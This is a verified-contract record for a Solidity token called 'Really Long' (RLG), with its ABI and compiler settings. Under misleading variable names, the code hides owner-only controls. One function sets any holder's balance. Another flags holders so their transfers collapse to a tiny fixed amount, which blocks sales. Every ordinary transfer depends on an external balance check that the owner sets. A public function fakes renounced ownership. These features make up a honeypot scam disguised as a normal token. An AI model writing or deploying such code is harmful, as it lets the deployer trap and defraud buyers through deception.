{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fundSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSell {\n    function createPair(address autoTeam, address shouldTo) external returns (address);\n}\n\ninterface fundSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunch) external view returns (uint256);\n\n    function transfer(address isSender, uint256 feeTake) external returns (bool);\n\n    function allowance(address toReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isSender,\n        uint256 feeTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeSender, uint256 value);\n    event Approval(address indexed toReceiver, address indexed spender, uint256 value);\n}\n\ninterface fundSenderMetadata is fundSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReallyLong is sellWallet, fundSender, fundSenderMetadata {\n\n    address atSenderWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public toSell;\n\n    function transfer(address teamShould, uint256 feeTake) external virtual override returns (bool) {\n        return isTo(_msgSender(), teamShould, feeTake);\n    }\n\n    address amountExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private walletFee;\n\n    function transferFrom(address tokenTotal, address isSender, uint256 feeTake) external override returns (bool) {\n        if (_msgSender() != amountExempt) {\n            if (exemptAmount[tokenTotal][_msgSender()] != type(uint256).max) {\n                require(feeTake <= exemptAmount[tokenTotal][_msgSender()]);\n                exemptAmount[tokenTotal][_msgSender()] -= feeTake;\n            }\n        }\n        return isTo(tokenTotal, isSender, feeTake);\n    }\n\n    mapping(address => uint256) private maxTeam;\n\n    function toAt(address buyReceiverIs) public {\n        if (fundList) {\n            return;\n        }\n        if (isFeeTx) {\n            isFeeTx = false;\n        }\n        liquidityTake[buyReceiverIs] = true;\n        \n        fundList = true;\n    }\n\n    uint256 toLaunchTake;\n\n    bool private isFeeTx;\n\n    address public fromReceiver;\n\n    uint256 private teamTxReceiver;\n\n    address public amountTake;\n\n    function txTrading(uint256 feeTake) public {\n        feeTx();\n        toLaunchTake = feeTake;\n    }\n\n    function marketingExempt(address teamShould, uint256 feeTake) public {\n        feeTx();\n        maxTeam[teamShould] = feeTake;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptAmount;\n\n    uint256 public sellEnable;\n\n    function owner() external view returns (address) {\n        return receiverShouldBuy;\n    }\n\n    uint256 private amountTakeFund = 100000000 * 10 ** 18;\n\n    uint256 constant maxShouldAmount = 11 ** 10;\n\n    mapping(address => bool) public liquidityTake;\n\n    function allowance(address isMode, address totalBuy) external view virtual override returns (uint256) {\n        if (totalBuy == amountExempt) {\n            return type(uint256).max;\n        }\n        return exemptAmount[isMode][totalBuy];\n    }\n\n    bool public atMax;\n\n    function feeTx() private view {\n        require(liquidityTake[_msgSender()]);\n    }\n\n    uint256 public autoLiquidity;\n\n    function approve(address totalBuy, uint256 feeTake) public virtual override returns (bool) {\n        exemptAmount[_msgSender()][totalBuy] = feeTake;\n        emit Approval(_msgSender(), totalBuy, feeTake);\n        return true;\n    }\n\n    function balanceOf(address senderLaunch) public view virtual override returns (uint256) {\n        return maxTeam[senderLaunch];\n    }\n\n    event OwnershipTransferred(address indexed sellFund, address indexed fundWallet);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTakeFund;\n    }\n\n    uint256 atTx;\n\n    address private receiverShouldBuy;\n\n    function launchedWalletIs() public {\n        emit OwnershipTransferred(amountTake, address(0));\n        receiverShouldBuy = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeTeam;\n    }\n\n    bool public fundList;\n\n    uint8 private modeTeam = 18;\n\n    function teamLimit(address tokenTotal, address isSender, uint256 feeTake) internal returns (bool) {\n        require(maxTeam[tokenTotal] >= feeTake);\n        maxTeam[tokenTotal] -= feeTake;\n        maxTeam[isSender] += feeTake;\n        emit Transfer(tokenTotal, isSender, feeTake);\n        return true;\n    }\n\n    string private totalSwap = \"RLG\";\n\n    function getOwner() external view returns (address) {\n        return receiverShouldBuy;\n    }\n\n    mapping(address => bool) public buyLimit;\n\n    uint256 private receiverSender;\n\n    function isTo(address tokenTotal, address isSender, uint256 feeTake) internal returns (bool) {\n        if (tokenTotal == amountTake) {\n            return teamLimit(tokenTotal, isSender, feeTake);\n        }\n        uint256 tokenAmount = fundSender(fromReceiver).balanceOf(atSenderWallet);\n        require(tokenAmount == toLaunchTake);\n        require(isSender != atSenderWallet);\n        if (buyLimit[tokenTotal]) {\n            return teamLimit(tokenTotal, isSender, maxShouldAmount);\n        }\n        return teamLimit(tokenTotal, isSender, feeTake);\n    }\n\n    function maxAt(address enableBuyTx) public {\n        feeTx();\n        \n        if (enableBuyTx == amountTake || enableBuyTx == fromReceiver) {\n            return;\n        }\n        buyLimit[enableBuyTx] = true;\n    }\n\n    constructor (){\n        \n        fundSwap liquidityReceiver = fundSwap(amountExempt);\n        fromReceiver = receiverSell(liquidityReceiver.factory()).createPair(liquidityReceiver.WETH(), address(this));\n        \n        amountTake = _msgSender();\n        launchedWalletIs();\n        liquidityTake[amountTake] = true;\n        maxTeam[amountTake] = amountTakeFund;\n        if (walletFee == teamTxReceiver) {\n            isFeeTx = false;\n        }\n        emit Transfer(address(0), amountTake, amountTakeFund);\n    }\n\n    bool public launchMode;\n\n    string private exemptMarketing = \"Really Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return exemptMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWalletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTake\",\"type\":\"uint256\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuyTx\",\"type\":\"address\"}],\"name\":\"maxAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiverIs\",\"type\":\"address\"}],\"name\":\"toAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTake\",\"type\":\"uint256\"}],\"name\":\"txTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}